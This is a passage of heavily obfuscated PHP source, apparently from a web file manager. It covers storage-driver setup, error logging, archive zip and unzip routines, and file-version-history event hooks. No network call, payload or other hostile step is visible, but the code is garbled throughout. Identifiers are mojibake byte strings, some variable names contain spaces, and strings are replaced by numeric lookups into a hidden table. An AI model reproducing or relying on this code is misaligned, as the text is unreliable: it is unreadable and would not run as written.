$úÂÑ¶©‹[$ÌıÒ‘¥¿[1259]]); $úÂÑ¶©‹[$ÌıÒ‘¥¿[571]] = $ñ¤ÃŒª; $úÂÑ¶©‹[$ÌıÒ‘¥¿[1241]] = $­†¸à; $™Ø˜¾¢Á = array($ÌıÒ‘¥¿[1261] => $ÌıÒ‘¥¿[1269], $ÌıÒ‘¥¿[6] => $úÂÑ¶©‹); } else { if (!$­†¸à) { $­†¸à = $ñ¤ÃŒª[$ÌıÒ‘¥¿[193]]; } } break; default: $­†¸à = $úÂÑ¶©‹[$ÌıÒ‘¥¿[87]]; $™Ø˜¾¢Á = array($ÌıÒ‘¥¿[1261] => $ÌıÒ‘¥¿[1270]); break; } $ŞÚú’Ï = $úÂÑ¶©‹[$ÌıÒ‘¥¿[87]]; if (!isset(self::$driverCache[$ŞÚú’Ï])) { $©‘Ã¢ÖŒ = strtolower($™Ø˜¾¢Á[$ÌıÒ‘¥¿[98]]); $ê‡¯ğÌó = $GLOBALS[$ÌıÒ‘¥¿[6]][$ÌıÒ‘¥¿[92]][$ÌıÒ‘¥¿[914]]; $ßø­·Ü = $ÌıÒ‘¥¿[77] . (isset($ê‡¯ğÌó[$©‘Ã¢ÖŒ]) ? $ê‡¯ğÌó[$©‘Ã¢ÖŒ] : ucfirst($©‘Ã¢ÖŒ)); if (!class_exists($ßø­·Ü)) { show_json("{$ßø­·Ü}\40\x6e\157\164\x20\145\170\151\x73\164\x73\x21", !1); } $¼„—Ø´’ = isset($™Ø˜¾¢Á[$ÌıÒ‘¥¿[6]]) ? $™Ø˜¾¢Á[$ÌıÒ‘¥¿[6]] : !1; self::$driverCache[$ŞÚú’Ï] = new $ßø­·Ü($¼„—Ø´’); } $¿é©˜¨æ = self::$driverCache[$ŞÚú’Ï]; $¿é©˜¨æ->pathDriver = $ùú­µ¼ú; $¿é©˜¨æ->pathBase = $ÌıÒ‘¥¿[12]; if (isset($™Ø˜¾¢Á[$ÌıÒ‘¥¿[6]][$ÌıÒ‘¥¿[1271]])) { $¿é©˜¨æ->pathBase = rtrim($™Ø˜¾¢Á[$ÌıÒ‘¥¿[6]][$ÌıÒ‘¥¿[1271]], $ÌıÒ‘¥¿[8]) . $ÌıÒ‘¥¿[8]; $­†¸à = $¿é©˜¨æ->pathBase . ltrim($­†¸à, $ÌıÒ‘¥¿[8]); } $­†¸à = $¿é©˜¨æ->getPath($­†¸à); if (isset($úÂÑ¶©‹[$ÌıÒ‘¥¿[1241]])) { $­†¸à = $úÂÑ¶©‹[$ÌıÒ‘¥¿[1241]]; } $¿é©˜¨æ->path = $­†¸à; return $¿é©˜¨æ; } public static function errorTips($Ê‡Ç‹Ì = false) { $É´àĞ„æ =& $_SERVER[¼’ç§¼´]; static $Í©áà…’ = array(); $í˜»®Öƒ = 1000; if ($Ê‡Ç‹Ì === -1) { return $Í©áà…’ ? $Í©áà…’[count($Í©áà…’) - 1] : $É´àĞ„æ[12]; } if ($Ê‡Ç‹Ì === !1) { return implode($É´àĞ„æ[287], $Í©áà…’); } if (count($Í©áà…’) >= $í˜»®Öƒ) { $Í©áà…’ = array_slice($Í©áà…’, $í˜»®Öƒ * 0.5, $í˜»®Öƒ); } $Í©áà…’[] = $Ê‡Ç‹Ì; write_log($É´àĞ„æ[176] . ACTION . $É´àĞ„æ[1272] . $Ê‡Ç‹Ì, $É´àĞ„æ[1273]); } public static function getLastError($ú”§ã¶é = '') { $ûÕÊÕ ‚ = self::errorTips(-1); return $ûÕÊÕ ‚ ? $ûÕÊÕ ‚ : $ú”§ã¶é; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $™İÃ¤‹ı; if ($™İÃ¤‹ı) { return $™İÃ¤‹ı; } $¯İ¿­ğ¿ = IO::init($_SERVER[¼’ç§¼´][8]); return $¯İ¿­ğ¿; } private static function iconvSystem($Šüé†Íİ) { return self::local()->iconvSystem($Šüé†Íİ); } private static function iconvApp($ÆÚçÒ) { return self::local()->iconvApp($ÆÚçÒ); } public static function zipFolder($¼›•™’Å, $ÒÕÃ¸‰µ = "\x7a\x69\x70", $İ¼Á¨îé = '', $ÈÚ²‰ƒ‘ = REPEAT_RENAME) { $ş„µç  =& $_SERVER[¼’ç§¼´]; $”Ğ‹Ñæè = IO::listPath($¼›•™’Å); if (!$”Ğ‹Ñæè) { return !1; } $”Ğ‹Ñæè = array_merge($”Ğ‹Ñæè[$ş„µç [85]], $”Ğ‹Ñæè[$ş„µç [86]]); return self::zip($”Ğ‹Ñæè, $ÒÕÃ¸‰µ, $İ¼Á¨îé, $ÈÚ²‰ƒ‘); } public static function zip($›‹ËÙ—º, $´´ÒğÕ = "\x7a\x69\160", $şıßä» = '', $‘˜¥Ù‰Ï = REPEAT_RENAME) { $¬Š„Úñ =& $_SERVER[¼’ç§¼´]; if (is_string($›‹ËÙ—º) && $›‹ËÙ—º) { $›‹ËÙ—º = array(array($¬Š„Úñ[87] => $›‹ËÙ—º)); } $†±ÈÆœÄ = self::init($›‹ËÙ—º[0][$¬Š„Úñ[87]]); $¯ÇÃ†ûò = self::info($›‹ËÙ—º[0][$¬Š„Úñ[87]]); $ÀÕí­éÉ = $¬Š„Úñ[12]; $éÔ†Ê¤­ = $¬Š„Úñ[12]; $ÛÙÂôßô = $¬Š„Úñ[12]; if ($şıßä» && substr($şıßä», -1, 1) != $¬Š„Úñ[8]) { $éÔ†Ê¤­ = get_path_father($şıßä»); $ÛÙÂôßô = get_path_this($şıßä»); } else { $éÔ†Ê¤­ = self::pathFather($¯ÇÃ†ûò[$¬Š„Úñ[87]]); $ÛÙÂôßô = $¯ÇÃ†ûò[$¬Š„Úñ[32]] . $¬Š„Úñ[10] . $´´ÒğÕ; if (count($›‹ËÙ—º) > 1) { $ŠÏ¶¶Ü = IO::info($éÔ†Ê¤­); $ÛÙÂôßô = $ŠÏ¶¶Ü[$¬Š„Úñ[32]] . $¬Š„Úñ[10] . $´´ÒğÕ; } if ($şıßä») { $éÔ†Ê¤­ = $şıßä»; } } if ($†±ÈÆœÄ->getType() == $¬Š„Úñ[109]) { $Şˆüˆ…³ = self::init($éÔ†Ê¤­); $òªëññ» = $Şˆüˆ…³->getType() == $¬Š„Úñ[109] ? $éÔ†Ê¤­ : get_path_father($†±ÈÆœÄ->path); $òªëññ» = rtrim($òªëññ», $¬Š„Úñ[8]) . $¬Š„Úñ[8]; mk_dir($òªëññ»); } else { $ÀÕí­éÉ = TEMP_FILES . $¬Š„Úñ[1274] . time() . rand_string(8) . $¬Š„Úñ[8]; mk_dir($ÀÕí­éÉ); file_put_contents($ÀÕí­éÉ . $¬Š„Úñ[1275], $¬Š„Úñ[12]); $òªëññ» = $ÀÕí­éÉ; } $ˆï£À¡¯ = IO::info($òªëññ»); if (!$ˆï£À¡¯ || !$ˆï£À¡¯[$¬Š„Úñ[235]]) { show_json(LNG($¬Š„Úñ[1276]), !1); } $ƒï‹Æàé = self::zipFileList($›‹ËÙ—º, $ÀÕí­éÉ); foreach ($ƒï‹Æàé as $ œ¨Õ·¸ => $½ÎÑ¢ßİ) { $ƒï‹Æàé[$ œ¨Õ·¸] = self::iconvSystem($½ÎÑ¢ßİ); } $Í—ãÇÌ = get_filename_auto($òªëññ» . $ÛÙÂôßô, $¬Š„Úñ[12], $‘˜¥Ù‰Ï); KodArchive::create(self::iconvSystem($Í—ãÇÌ), $ƒï‹Æàé); if (!IO::exist($Í—ãÇÌ)) { if ($ÀÕí­éÉ) { del_dir($ÀÕí­éÉ); } write_log($¬Š„Úñ[1277] . $Í—ãÇÌ, $¬Š„Úñ[390]); show_json(LNG($¬Š„Úñ[1278]), !1); } if (!$ÀÕí­éÉ) { return $Í—ãÇÌ; } $Àğøİş = self::move($Í—ãÇÌ, $éÔ†Ê¤­, $‘˜¥Ù‰Ï); if ($ÀÕí­éÉ) { del_dir($ÀÕí­éÉ); } if (!$Í—ãÇÌ) { write_log($¬Š„Úñ[1279] . $Í—ãÇÌ . $¬Š„Úñ[1280] . $éÔ†Ê¤­, $¬Š„Úñ[390]); show_json(LNG($¬Š„Úñ[1278]), !1); } return $Àğøİş; } public static function unzip($ÈÃ†•û, $—çÈÕÌù, $óÒŠ—œ = "\x2d\x31", $öÙçûÓ® = "\x72\145\x70\x6c\141\x63\145") { $ôÇ™ËŒ† =& $_SERVER[¼’ç§¼´]; $‰ÚÜª’Æ = parent::info($ÈÃ†•û); if (!$‰ÚÜª’Æ) { show_json(LNG($ôÇ™ËŒ†[1281]), !1); } $–áø¾¸» = IO::infoFullSimple($—çÈÕÌù); if (!$–áø¾¸») { $—çÈÕÌù = IO::mkdir($—çÈÕÌù); } if (isset($–áø¾¸»[$ôÇ™ËŒ†[193]]) && trim($–áø¾¸»[$ôÇ™ËŒ†[87]], $ôÇ™ËŒ†[8]) != trim($—çÈÕÌù, $ôÇ™ËŒ†[8])) { $Œ×óÆ§ = KodIO::make($–áø¾¸»[$ôÇ™ËŒ†[192]]); $¶æ÷’Î¾ = IO::fileNameAuto($Œ×óÆ§, $–áø¾¸»[$ôÇ™ËŒ†[32]], REPEAT_RENAME_FOLDER, !0); $—çÈÕÌù = IO::mkdir($Œ×óÆ§ . $¶æ÷’Î¾); } $óÒŠ—œ = $óÒŠ—œ && $óÒŠ—œ != $ôÇ™ËŒ†[1282] ? @json_decode($óÒŠ—œ, !0) : -1; $¨ÇŞ¹è = self::unzipPart($ÈÃ†•û, $óÒŠ—œ); if (!$¨ÇŞ¹è || !IO::exist($¨ÇŞ¹è[$ôÇ™ËŒ†[232]])) { show_json(LNG($ôÇ™ËŒ†[108]), !1); } $óØèªòç = $¨ÇŞ¹è[$ôÇ™ËŒ†[1283]][count($¨ÇŞ¹è[$ôÇ™ËŒ†[1283]]) - 1]; if ($óØèªòç[$ôÇ™ËŒ†[1284]] == -1 || substr($óØèªòç[$ôÇ™ËŒ†[32]], -1, 1) == $ôÇ™ËŒ†[8]) { $èË†èò = $¨ÇŞ¹è[$ôÇ™ËŒ†[1285]] . rand_string(10) . $ôÇ™ËŒ†[8]; mk_dir($èË†èò); $ï€àãğ¾ = count($¨ÇŞ¹è[$ôÇ™ËŒ†[1283]]) == 1 ? IO::ext($ÈÃ†•û) : get_path_ext($¨ÇŞ¹è[$ôÇ™ËŒ†[232]]); $ßêÊÍîÓ = KodArchive::extract(self::iconvSystem($¨ÇŞ¹è[$ôÇ™ËŒ†[232]]), $èË†èò, $óØèªòç[$ôÇ™ËŒ†[1284]], $¶æ÷’Î¾, $ï€àãğ¾); self::unzipErrorCheck($ßêÊÍîÓ, array($ôÇ™ËŒ†[1286], $ÈÃ†•û, $ï€àãğ¾, $—çÈÕÌù, $¨ÇŞ¹è)); Hook::trigger($ôÇ™ËŒ†[1287], $èË†èò); recursion_dir($èË†èò, $Ò«õÒùä, $Ò§Ãæè, 0); $‘›ÚÅÕµ = array_merge($Ò«õÒùä, $Ò§Ãæè); $ºÆÚ™İÓ = array(); foreach ($‘›ÚÅÕµ as $ê¾ÓÀ‹) { $ù«şäèâ = IO::move(self::iconvApp($ê¾ÓÀ‹), $—çÈÕÌù, $öÙçûÓ®); if ($ù«şäèâ) { $ºÆÚ™İÓ[] = $ù«şäèâ; } } del_dir($èË†èò); } else { $ù«şäèâ = IO::move($¨ÇŞ¹è[$ôÇ™ËŒ†[232]], $—çÈÕÌù, $öÙçûÓ®, get_path_this($óØèªòç[$ôÇ™ËŒ†[32]])); if ($ù«şäèâ) { $ºÆÚ™İÓ[] = $ù«şäèâ; } } return $ºÆÚ™İÓ ? $ºÆÚ™İÓ : !1; } public static function unzipList($ÍÙÍ€éÁ) { $¥ìÔÆÚ =& $_SERVER[¼’ç§¼´]; $ÔıÆÕÜ¹ = isset($ÍÙÍ€éÁ[$¥ìÔÆÚ[1288]]) ? $ÍÙÍ€éÁ[$¥ìÔÆÚ[1288]] : !1; $ì¥¸‚âÈ = isset($ÍÙÍ€éÁ[$¥ìÔÆÚ[1284]]) ? @json_decode($ÍÙÍ€éÁ[$¥ìÔÆÚ[1284]], !0) : -1; $è¿‡ÉĞ = self::unzipPart($ÍÙÍ€éÁ[$¥ìÔÆÚ[87]], $ì¥¸‚âÈ); if (!$è¿‡ÉĞ || !IO::exist($è¿‡ÉĞ[$¥ìÔÆÚ[232]])) { show_json(LNG($¥ìÔÆÚ[108]), !1); } $ÉŒÖ¦Ò¤ = $è¿‡ÉĞ[$¥ìÔÆÚ[1283]][count($è¿‡ÉĞ[$¥ìÔÆÚ[1283]]) - 1]; $ÜÉ§¡æı = in_array(IO::ext($è¿‡ÉĞ[$¥ìÔÆÚ[232]]), array($¥ìÔÆÚ[390], $¥ìÔÆÚ[1289], $¥ìÔÆÚ[1290], $¥ìÔÆÚ[1291], $¥ìÔÆÚ[1292], $¥ìÔÆÚ[1293])); if (!$ÔıÆÕÜ¹ && ($ÉŒÖ¦Ò¤[$¥ìÔÆÚ[1284]] == -1 || $ÜÉ§¡æı)) { $Ìà°ü¢é = $è¿‡ÉĞ[$¥ìÔÆÚ[1285]] . get_path_this($è¿‡ÉĞ[$¥ìÔÆÚ[232]]) . $¥ìÔÆÚ[1294]; if (!IO::exist($Ìà°ü¢é)) { $ö»½´—´ = $ÉŒÖ¦Ò¤[$¥ìÔÆÚ[1284]] == -1 ? get_path_ext(IO::pathThis($ÍÙÍ€éÁ[$¥ìÔÆÚ[87]])) : get_path_ext($è¿‡ÉĞ[$¥ìÔÆÚ[232]]); $ÁĞÂ¡¨„ = KodArchive::listContent(self::iconvSystem($è¿‡ÉĞ[$¥ìÔÆÚ[232]]), !0, $ö»½´—´); self::unzipErrorCheck($ÁĞÂ¡¨„, array($¥ìÔÆÚ[1295], $ÍÙÍ€éÁ, $è¿‡ÉĞ)); @file_put_contents($Ìà°ü¢é, json_encode($ÁĞÂ¡¨„[$¥ìÔÆÚ[1296]])); } return @json_decode(IO::getContent($Ìà°ü¢é), !0); } IO::fileOut($è¿‡ÉĞ[$¥ìÔÆÚ[232]], $ÔıÆÕÜ¹, get_path_this($ÉŒÖ¦Ò¤[$¥ìÔÆÚ[32]])); die; } private static function zipFileList($ÌÃèîè, $ñûå’¹™ = false) { $ºÇ£ƒ° =& $_SERVER[¼’ç§¼´]; $êÛõáô« = array(); foreach ($ÌÃèîè as $ÅÂª©³ı) { $ãÜ“œË– = $ÅÂª©³ı[$ºÇ£ƒ°[87]]; if ($ñûå’¹™) { $ãÜ“œË– = self::copy($ÅÂª©³ı[$ºÇ£ƒ°[87]], $ñûå’¹™, $ºÇ£ƒ°[907]); } else { $®îñëêÃ = self::init($ÅÂª©³ı[$ºÇ£ƒ°[87]]); if ($®îñëêÃ->getType() == $ºÇ£ƒ°[109]) { $ãÜ“œË– = $®îñëêÃ->path; } } if ($ãÜ“œË– && self::local()->exist($ãÜ“œË–)) { $êÛõáô«[$ÅÂª©³ı[$ºÇ£ƒ°[87]]] = $ãÜ“œË–; } } if (!empty($êÛõáô«)) { return array_values($êÛõáô«); } show_json(LNG($ºÇ£ƒ°[1255]), !1); } private static function localFilePath($ú–¿¹îÀ) { $ãÛıñ¢¦ =& $_SERVER[¼’ç§¼´]; $ÇŠ¡íÖÂ = KodIO::parse($ú–¿¹îÀ); if ($ÇŠ¡íÖÂ[$ãÛıñ¢¦[33]] == KodIO::KOD_SOURCE) { $æ†½æ‹ë = Model($ãÛıñ¢¦[913])->fileInfoGet(KodIO::sourceID($ú–¿¹îÀ)); if (!$æ†½æ‹ë[$ãÛıñ¢¦[87]]) { show_json($ãÛıñ¢¦[1297], !1); } $ú–¿¹îÀ = $æ†½æ‹ë[$ãÛıñ¢¦[87]]; } $–ŞÄ£è = self::init($ú–¿¹îÀ); if ($–ŞÄ£è->pathParse[$ãÛıñ¢¦[1241]]) { $ú–¿¹îÀ = $–ŞÄ£è->pathParse[$ãÛıñ¢¦[1241]]; $–ŞÄ£è = self::init($ú–¿¹îÀ); } $É”¸¾Öß = $–ŞÄ£è->getType(); if ($É”¸¾Öß == $ãÛıñ¢¦[109] || $É”¸¾Öß == $ãÛıñ¢¦[1298]) { if (!$–ŞÄ£è->exist($–ŞÄ£è->path)) { show_json(LNG($ãÛıñ¢¦[108]), !1); } return $–ŞÄ£è->path; } return !1; } public static function unzipPart($î·”ÉË·, $ø‚è„ = -1) { $Ÿ¶£ÌŠ¨ =& $_SERVER[¼’ç§¼´]; $áó¨€¢• = IO::pathThis($î·”ÉË·); if (!$ø‚è„ || $ø‚è„ == -1) { $Å£¬ƒ¨ = array(array($Ÿ¶£ÌŠ¨[32] => $áó¨€¢•, $Ÿ¶£ÌŠ¨[1284] => -1)); $Å£¬ƒ¨[0][$Ÿ¶£ÌŠ¨[1299]] = $Å£¬ƒ¨[0][$Ÿ¶£ÌŠ¨[32]]; } else { if (is_array($ø‚è„)) { $Å£¬ƒ¨ = $ø‚è„; $Ô±î Ëƒ = count($Å£¬ƒ¨) - 1; for ($éâØ¿Î¥ = 0; $éâØ¿Î¥ <= $Ô±î Ëƒ; $éâØ¿Î¥++) { $´£Ä‹Èô = $Å£¬ƒ¨[$éâØ¿Î¥]; $èŒç¤˜• = get_path_this($´£Ä‹Èô[$Ÿ¶£ÌŠ¨[32]]) . (checkExtSafe($´£Ä‹Èô[$Ÿ¶£ÌŠ¨[32]]) ? $Ÿ¶£ÌŠ¨[12] : $Ÿ¶£ÌŠ¨[1300]); $Å£¬ƒ¨[$éâØ¿Î¥][$Ÿ¶£ÌŠ¨[1299]] = $Ÿ¶£ÌŠ¨[1301] . intval($´£Ä‹Èô[$Ÿ¶£ÌŠ¨[1284]]) . $Ÿ¶£ÌŠ¨[473] . $èŒç¤˜•; if ($éâØ¿Î¥ == 0) { continue; } $Å£¬ƒ¨[$éâØ¿Î¥][$Ÿ¶£ÌŠ¨[1299]] = $Å£¬ƒ¨[$éâØ¿Î¥ - 1][$Ÿ¶£ÌŠ¨[1299]] . $Ÿ¶£ÌŠ¨[1302] . $Å£¬ƒ¨[$éâØ¿Î¥][$Ÿ¶£ÌŠ¨[1299]]; } } } if (!is_array($Å£¬ƒ¨) || count($Å£¬ƒ¨) == 0) { return !1; } $õ¼‘üä€ = $Å£¬ƒ¨[count($Å£¬ƒ¨) - 1]; if (!IO::exist($î·”ÉË·)) { return !1; } $§Ú‰¢‡í = TEMP_FILES . $Ÿ¶£ÌŠ¨[1303] . kodIO::hashPathSafe($î·”ÉË·) . $Ÿ¶£ÌŠ¨[8]; $ ’ æÎÏ = $§Ú‰¢‡í . $õ¼‘üä€[$Ÿ¶£ÌŠ¨[1299]]; mk_dir($§Ú‰¢‡í); file_put_contents(TEMP_FILES . $Ÿ¶£ÌŠ¨[1275], $Ÿ¶£ÌŠ¨[12]); if (IO::exist($ ’ æÎÏ)) { return array($Ÿ¶£ÌŠ¨[232] => $ ’ æÎÏ, $Ÿ¶£ÌŠ¨[1283] => $Å£¬ƒ¨, $Ÿ¶£ÌŠ¨[1285] => $§Ú‰¢‡í); } $¾•‘ÏÅ = self::localFilePath($î·”ÉË·); if (!$¾•‘ÏÅ) { $¾•‘ÏÅ = $§Ú‰¢‡í . $Ÿ¶£ÌŠ¨[1304]; if (!IO::exist($¾•‘ÏÅ)) { self::copy($î·”ÉË·, $§Ú‰¢‡í, !1, get_path_this($¾•‘ÏÅ)); } } if (!$¾•‘ÏÅ || !IO::exist($¾•‘ÏÅ)) { return !1; } if ($õ¼‘üä€[$Ÿ¶£ÌŠ¨[1284]] == -1) { return array($Ÿ¶£ÌŠ¨[232] => $¾•‘ÏÅ, $Ÿ¶£ÌŠ¨[1283] => $Å£¬ƒ¨, $Ÿ¶£ÌŠ¨[1285] => $§Ú‰¢‡í); } $èœ·è¸Å = $¾•‘ÏÅ; foreach ($Å£¬ƒ¨ as $éâØ¿Î¥ => $´£Ä‹Èô) { if (!$´£Ä‹Èô || $´£Ä‹Èô[$Ÿ¶£ÌŠ¨[1284]] == $Ÿ¶£ÌŠ¨[1282]) { break; } if (substr($´£Ä‹Èô[$Ÿ¶£ÌŠ¨[32]], -1, 1) == $Ÿ¶£ÌŠ¨[8]) { break; } $ï‡Æø©± = in_array(get_path_ext($´£Ä‹Èô[$Ÿ¶£ÌŠ¨[1299]]), array($Ÿ¶£ÌŠ¨[390], $Ÿ¶£ÌŠ¨[1289], $Ÿ¶£ÌŠ¨[1290], $Ÿ¶£ÌŠ¨[1291], $Ÿ¶£ÌŠ¨[1292], $Ÿ¶£ÌŠ¨[1293])); $Óš†™Ë = $éâØ¿Î¥ == count($Å£¬ƒ¨) - 1 && $ï‡Æø©±; $¼Ì™Õ¦ = $§Ú‰¢‡í . $´£Ä‹Èô[$Ÿ¶£ÌŠ¨[1299]]; $ÜÃœé§ = $§Ú‰¢‡í . get_path_this($´£Ä‹Èô[$Ÿ¶£ÌŠ¨[32]]); if (IO::exist($¼Ì™Õ¦)) { $èœ·è¸Å = $¼Ì™Õ¦; continue; } $Õ…“Š·• = $éâØ¿Î¥ == 0 ? get_path_ext($áó¨€¢•) : get_path_ext($èœ·è¸Å); $Š­Ê‚ = KodArchive::extract(self::iconvSystem($èœ·è¸Å), $§Ú‰¢‡í, $´£Ä‹Èô[$Ÿ¶£ÌŠ¨[1284]], $Öˆš¢Ú, $Õ…“Š·•); self::unzipErrorCheck($Š­Ê‚, array($Ÿ¶£ÌŠ¨[1305], $î·”ÉË·, $Å£¬ƒ¨, $´£Ä‹Èô, $¼Ì™Õ¦)); if (IO::exist($ÜÃœé§)) { IO::rename($ÜÃœé§, get_path_this($¼Ì™Õ¦)); } $èœ·è¸Å = $¼Ì™Õ¦; } $ ’ æÎÏ = $èœ·è¸Å; return array($Ÿ¶£ÌŠ¨[232] => $èœ·è¸Å, $Ÿ¶£ÌŠ¨[1283] => $Å£¬ƒ¨, $Ÿ¶£ÌŠ¨[1285] => $§Ú‰¢‡í); } private static function unzipErrorCheck($—Ïâ‘², $ƒ§¹ƒ¡ = false) { $÷€è·Š– =& $_SERVER[¼’ç§¼´]; if ($—Ïâ‘²[$÷€è·Š–[1306]]) { return !0; } write_log(array($÷€è·Š–[1307], $—Ïâ‘², $ƒ§¹ƒ¡), $÷€è·Š–[1308]); show_json($÷€è·Š–[1309] . json_encode($—Ïâ‘²[$÷€è·Š–[1296]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ƒåÒÏ•â =& $_SERVER[¼’ç§¼´]; $ëàì¤ïÂ = $GLOBALS[$ƒåÒÏ•â[6]][$ƒåÒÏ•â[92]]; if ($ëàì¤ïÂ[$ƒåÒÏ•â[1310]] != 1) { return; } if ($ëàì¤ïÂ[$ƒåÒÏ•â[1311]] <= 0) { return; } if (isset($_REQUEST[$ƒåÒÏ•â[1312]]) && $_REQUEST[$ƒåÒÏ•â[1312]] == $ƒåÒÏ•â[91]) { return; } Hook::bind($ƒåÒÏ•â[1313], $ƒåÒÏ•â[1314]); Hook::bind($ƒåÒÏ•â[1315], $ƒåÒÏ•â[1316]); Hook::bind($ƒåÒÏ•â[1317], $ƒåÒÏ•â[1318]); Hook::bind($ƒåÒÏ•â[1319], $ƒåÒÏ•â[1320]); Hook::bind($ƒåÒÏ•â[1321], $ƒåÒÏ•â[1322]); Hook::bind($ƒåÒÏ•â[1323], $ƒåÒÏ•â[1324]); } public static function eventBeforeUpload($‘®ò€–Å) { if ($‘®ò€–Å[3] && $‘®ò€–Å[3] != REPEAT_REPLACE) { return; } $úÙğ‰¯• = self::parsePath($‘®ò€–Å[0]); if (!$úÙğ‰¯•) { return; } self::add($úÙğ‰¯•); } public static function eventBeforeEdit($şà¿€®) { $Èî¿‚Ã¤ = self::parsePath($şà¿€®[0]); if (!$Èî¿‚Ã¤) { return; } self::add($Èî¿‚Ã¤); } public static function eventBeforeCopyFile($ô´ÛÕ±ß, $ŞÏ§³¹Û, $®Ø‚™ˆ, $ïã…– ñ, $®ûê²¥¾, $¿ÇªÊ¼) { $´©ó¸ğŒ =& $_SERVER[¼’ç§¼´]; if (isset($®Ø‚™ˆ->_data[$´©ó¸ğŒ[1245]]) && $®Ø‚™ˆ->_data[$´©ó¸ğŒ[1245]]) { return; } $é³Í‹î¥ = $®Ø‚™ˆ->getPathOuter($ïã…– ñ); $üû¢•¡Æ = self::parsePath($é³Í‹î¥); if (!$üû¢•¡Æ) { return; } self::add($üû¢•¡Æ); } public static function eventBeforeRename($Ùõµ—Õ¥) { $ÙçÔ­Ëæ =& $_SERVER[¼’ç§¼´]; $¨·Ï€Æà = self::parsePath($Ùõµ—Õ¥[0]); if (!$¨·Ï€Æà) { return; } $°Æ«¶òØ = self::checkInHistory($¨·Ï€Æà); if (!$°Æ«¶òØ) { return; } if ($°Æ«¶òØ[$ÙçÔ­Ëæ[33]] == $ÙçÔ­Ëæ[232]) { $ã³Ñª€ = self::listData($¨·Ï€Æà); if ($ã³Ñª€ && $ã³Ñª€[$ÙçÔ­Ëæ[456]]) { self::moveHistory($¨·Ï€Æà, $Ùõµ—Õ¥[1]); } } else { IO::rename($°Æ«¶òØ[$ÙçÔ­Ëæ[87]], $Ùõµ—Õ¥[1]); } } public static function eventBeforeMove($…È‰ç) { $Æ®Ìå“ =& $_SERVER[¼’ç§¼´]; $€ÓÚŠÈƒ = self::parsePath($…È‰ç[0]); if (!$€ÓÚŠÈƒ) { return; } $‹½ôİßŞ = self::parsePath($…È‰ç[1]); if (!$‹½ôİßŞ) { return; } $å—¾‰…› = $…È‰ç[3]; $¦ÙÉ¦€² = self::checkInHistory($€ÓÚŠÈƒ); if (!$¦ÙÉ¦€²) { return; } $¼šƒ»§œ = self::pathHistory($‹½ôİßŞ); if ($¦ÙÉ¦€²[$Æ®Ìå“[33]] == $Æ®Ìå“[232]) { $Ú•€Ï…¿ = self::listData($€ÓÚŠÈƒ); $ÏŞµò×ˆ = rtrim($‹½ôİßŞ, $Æ®Ìå“[8]) . $Æ®Ìå“[8] . ($å—¾‰…› ? $å—¾‰…› : get_path_this($€ÓÚŠÈƒ)); $’á¬úÒ¥ = self::listData($ÏŞµò×ˆ); if ($Ú•€Ï…¿ && $Ú•€Ï…¿[$Æ®Ìå“[456]] && $’á¬úÒ¥ && $’á¬úÒ¥[$Æ®Ìå“[456]]) { return self::clear($€ÓÚŠÈƒ); } if ($Ú•€Ï…¿ && $Ú•€Ï…¿[$Æ®Ìå“[456]]) { self::moveHistory($€ÓÚŠÈƒ, $å—¾‰…›, $¼šƒ»§œ); } } else { IO::move($¦ÙÉ¦€²[$Æ®Ìå“[87]], $¼šƒ»§œ, !1, $å—¾‰…›); self::clearEmptyFolder(IO::pathFather($¦ÙÉ¦€²[$Æ®Ìå“[87]])); } } public static function eventAfterRemove($ë¢÷ì ¿, $…á³) { $ä®¼ù’á =& $_SERVER[¼’ç§¼´]; if (!$…á³) { return; } $£şíºÚÅ = self::parsePath($ë¢÷ì ¿[0]); if (!$£şíºÚÅ) { return; } $À·Á»È° = self::checkInHistory($£şíºÚÅ); if (!$À·Á»È°) { return; } if ($À·Á»È°[$ä®¼ù’á[33]] == $ä®¼ù’á[232]) { $âŸ³ù´î = self::listData($£şíºÚÅ, !1); if ($âŸ³ù´î && $âŸ³ù´î[$ä®¼ù’á[456]]) { self::clear($£şíºÚÅ, !1); } } else { IO::remove($À·Á»È°[$ä®¼ù’á[87]]); self::clearEmptyFolder(IO::pathFather($À·Á»È°[$ä®¼ù’á[87]])); } } private static function checkInHistory($Ğ™ÁÓéì) { $êŒ¿Äšº = self::pathHistory($Ğ™ÁÓéì); if (!IO::exist($êŒ¿Äšº)) { $êŒ¿Äšº .= $_SERVER[¼’ç§¼´][1325]; } return IO::exist($êŒ¿Äšº) ? IO::info($êŒ¿Äšº) : !1; } private static function parsePath($°ŠÏÉ¼€) { $¸’œ Á‹ =& $_SERVER[¼’ç§¼´]; if (!$°ŠÏÉ¼€) { return !1; } if (isset($GLOBALS[$¸’œ Á‹[1326]]) && $GLOBALS[$¸’œ Á‹[1326]]) { return; } $º®Ã÷ê“ = KodIO::parse($°ŠÏÉ¼€); $üáØŠô© = $º®Ã÷ê“[$¸’œ Á‹[33]]; $èùÂÍ³ = !$üáØŠô© || $üáØŠô© == KodIO::KOD_IO || $üáØŠô© == KodIO::KOD_SHARE_ITEM; if (!$èùÂÍ³ || !$º®Ã÷ê“[$¸’œ Á‹[1327]]) { return !1; } if (substr($°ŠÏÉ¼€, 0, strlen(DATA_PATH . $¸’œ Á‹[1328])) == DATA_PATH . $¸’œ Á‹[1328]) { return !1; } if ($üáØŠô© == KodIO::KOD_SHARE_ITEM) { $¤»Ş½ñ¯ = IO::init($°ŠÏÉ¼€); if ($¤»Ş½ñ¯->pathParse[$¸’œ Á‹[1241]]) { return self::parsePath($¤»Ş½ñ¯->pathParse[$¸’œ Á‹[1241]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ö×Ñ™ø¸ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¸’œ Á‹[1329]); foreach ($ö×Ñ™ø¸ as $ä°…¹‚µ) { if (!$üáØŠô© && substr($°ŠÏÉ¼€, 0, strlen($ä°…¹‚µ)) == $ä°…¹‚µ) { return !1; } } self::log($GLOBALS[$¸’œ Á‹[1236]] . $¸’œ Á‹[1330] . $°ŠÏÉ¼€); return $°ŠÏÉ¼€; } private static function pathHistory($Šâ¦Äêõ) { $‰´¹ ¹Í =& $_SERVER[¼’ç§¼´]; $¢çØôÉ© = self::$_historyBase . ltrim(KodIO::clear($Šâ¦Äêõ), $‰´¹ ¹Í[8]); $¢çØôÉ© = str_replace(array($‰´¹ ¹Í[1331]), array($‰´¹ ¹Í[1332]), $¢çØôÉ©); return $¢çØôÉ©; } public static function log($Ò‹ä½ĞÕ) { } public static function historyCount($Óñ¨»˜) 